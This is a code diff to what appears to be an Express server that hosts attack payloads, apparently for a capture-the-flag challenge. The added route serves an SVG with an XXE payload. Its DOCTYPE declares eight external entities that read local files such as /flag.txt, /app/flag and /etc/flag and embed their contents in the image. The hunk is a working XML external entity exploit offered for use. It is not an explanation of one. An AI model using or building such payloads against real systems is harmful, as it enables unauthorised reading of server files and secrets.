@@ -17,6 +17,28 @@ app.get('/test', (req, res) => {
 });
 
 // 1. XXE Injection in SVG
+app.get('/flag-locations.svg', (req, res) => {
+  console.log('Flag locations SVG requested');
+  const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY flag1 SYSTEM "file:///flag.txt">
+  <!ENTITY flag2 SYSTEM "file:///flag">
+  <!ENTITY flag3 SYSTEM "file:///app/flag.txt">
+  <!ENTITY flag4 SYSTEM "file:///app/flag">
+  <!ENTITY flag5 SYSTEM "file:///home/flag.txt">
+  <!ENTITY flag6 SYSTEM "file:///etc/flag">
+  <!ENTITY flag7 SYSTEM "file:///var/flag">
+  <!ENTITY flag8 SYSTEM "file:///tmp/flag">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <rect width="100" height="100" fill="red"/>
+  <text x="10" y="10" font-size="3">
+    &flag1;&flag2;&flag3;&flag4;&flag5;&flag6;&flag7;&flag8;
+  </text>
+</svg>`;
+  res.setHeader('Content-Type', 'image/svg+xml');
+  res.send(svgPayload);
+});
 app.get('/xxe.svg', (req, res) => {
   console.log('XXE SVG requested');
   const svgPayload = `<?xml version="1.0" encoding="UTF-8"?>
